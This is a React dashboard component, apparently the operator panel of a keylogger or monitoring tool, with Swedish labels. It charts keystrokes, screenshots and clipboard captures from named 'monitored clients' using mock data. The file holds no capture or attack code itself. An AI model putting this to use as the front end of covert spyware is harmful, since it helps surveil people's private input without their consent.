
import React, { useState, useEffect } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Table, TableHeader, TableRow, TableHead, TableBody, TableCell } from "@/components/ui/table";
import { Skeleton } from "@/components/ui/skeleton";
import { useQuery } from "@tanstack/react-query";
import { DashboardHeader } from "@/components/dashboard/DashboardHeader";
import { ClientCountWidget } from "@/components/dashboard/ClientCountWidget";
import { StorageWidget } from "@/components/dashboard/StorageWidget";
import { ActivityChart } from "@/components/dashboard/ActivityChart";
import { RecentActivityWidget } from "@/components/dashboard/RecentActivityWidget";
import { Badge } from "@/components/ui/badge";

const fetchDashboardData = async () => {
  // Exempel på hur data skulle hämtas från servern
  // I en verklig implementation skulle detta anropa API:er från Python servern
  const response = await fetch('/api/dashboard');
  if (!response.ok) {
    throw new Error('Failed to fetch dashboard data');
  }
  return response.json();
};

export default function Dashboard() {
  const { data, isLoading, error } = useQuery({
    queryKey: ['dashboardData'],
    queryFn: fetchDashboardData,
    // För utveckling kan vi använda mockad data om API inte existerar ännu
    placeholderData: {
      totalClients: 8,
      activeClients: 5,
      totalLogs: 1243,
      storageUsed: "32.5 MB",
      latestActivity: "2023-03-21 14:35:22",
      recentActivities: [
        { id: 1, client: "john_laptop", type: "keystrokes", timestamp: "2023-03-21 14:35:22" },
        { id: 2, client: "emma_desktop", type: "screenshot", timestamp: "2023-03-21 14:30:15" },
        { id: 3, client: "david_pc", type: "clipboard", timestamp: "2023-03-21 14:28:10" }
      ],
      clients: [
        { id: "john_laptop", name: "John (Laptop)", isActive: true, lastActivity: "2023-03-21 14:35:22", os: "Windows 10" },
        { id: "emma_desktop", name: "Emma (Desktop)", isActive: true, lastActivity: "2023-03-21 14:30:15", os: "Windows 11" },
        { id: "david_pc", name: "David (PC)", isActive: true, lastActivity: "2023-03-21 14:28:10", os: "macOS" },
        { id: "sarah_laptop", name: "Sarah (Laptop)", isActive: true, lastActivity: "2023-03-21 14:20:05", os: "Ubuntu" },
        { id: "alex_home", name: "Alex (Home)", isActive: true, lastActivity: "2023-03-21 14:15:48", os: "Windows 10" },
        { id: "lisa_work", name: "Lisa (Work)", isActive: false, lastActivity: "2023-03-21 10:45:30", os: "Windows 10" },
        { id: "mark_pc", name: "Mark (PC)", isActive: false, lastActivity: "2023-03-21 09:20:15", os: "Windows 11" },
        { id: "julia_laptop", name: "Julia (Laptop)", isActive: false, lastActivity: "2023-03-20 17:35:22", os: "macOS" }
      ],
      activityData: [
        { name: "00:00", keystrokes: 20, screenshots: 5, clipboard: 8 },
        { name: "04:00", keystrokes: 0, screenshots: 5, clipboard: 0 },
        { name: "08:00", keystrokes: 120, screenshots: 15, clipboard: 30 },
        { name: "12:00", keystrokes: 200, screenshots: 20, clipboard: 45 },
        { name: "16:00", keystrokes: 180, screenshots: 25, clipboard: 38 },
        { name: "20:00", keystrokes: 100, screenshots: 15, clipboard: 25 }
      ]
    }
  });

  if (error) {
    return <div className="p-6">Fel vid hämtning av dashboard-data: {error.message}</div>;
  }

  return (
    <div className="h-full flex-1 flex-col space-y-8 p-8 md:flex">
      <DashboardHeader />
      
      <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
        <ClientCountWidget 
          isLoading={isLoading} 
          totalClients={data?.totalClients || 0} 
          activeClients={data?.activeClients || 0} 
        />
        
        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Totalt antal loggar</CardTitle>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <Skeleton className="h-6 w-20" />
            ) : (
              <div className="text-2xl font-bold">{data?.totalLogs}</div>
            )}
          </CardContent>
        </Card>
        
        <StorageWidget isLoading={isLoading} storageUsed={data?.storageUsed || "0 B"} />
        
        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Senaste aktivitet</CardTitle>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <Skeleton className="h-6 w-36" />
            ) : (
              <div className="text-sm font-medium">{data?.latestActivity}</div>
            )}
          </CardContent>
        </Card>
      </div>
      
      <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-7">
        <Card className="col-span-4">
          <CardHeader>
            <CardTitle>Aktivitetsöversikt (24 timmar)</CardTitle>
          </CardHeader>
          <CardContent className="pl-2">
            <ActivityChart data={data?.activityData || []} />
          </CardContent>
        </Card>
        
        <Card className="col-span-3">
          <CardHeader>
            <CardTitle>Senaste aktiviteter</CardTitle>
          </CardHeader>
          <CardContent>
            <RecentActivityWidget activities={data?.recentActivities || []} isLoading={isLoading} />
          </CardContent>
        </Card>
      </div>
      
      <Card>
        <CardHeader>
          <CardTitle>Klientöversikt</CardTitle>
          <CardDescription>
            Lista över övervakade klienter och deras status
          </CardDescription>
        </CardHeader>
        <CardContent>
          <ScrollArea className="h-[300px] w-full">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Klient</TableHead>
                  <TableHead>Status</TableHead>
                  <TableHead>Senaste aktivitet</TableHead>
                  <TableHead>OS</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {isLoading ? (
                  Array.from({ length: 5 }).map((_, i) => (
                    <TableRow key={i}>
                      <TableCell><Skeleton className="h-4 w-32" /></TableCell>
                      <TableCell><Skeleton className="h-4 w-16" /></TableCell>
                      <TableCell><Skeleton className="h-4 w-36" /></TableCell>
                      <TableCell><Skeleton className="h-4 w-20" /></TableCell>
                    </TableRow>
                  ))
                ) : (
                  data?.clients.map((client) => (
                    <TableRow key={client.id}>
                      <TableCell className="font-medium">{client.name}</TableCell>
                      <TableCell>
                        <Badge variant={client.isActive ? "success" : "destructive"}>
                          {client.isActive ? "Online" : "Offline"}
                        </Badge>
                      </TableCell>
                      <TableCell>{client.lastActivity}</TableCell>
                      <TableCell>{client.os}</TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </ScrollArea>
        </CardContent>
      </Card>
    </div>
  );
}
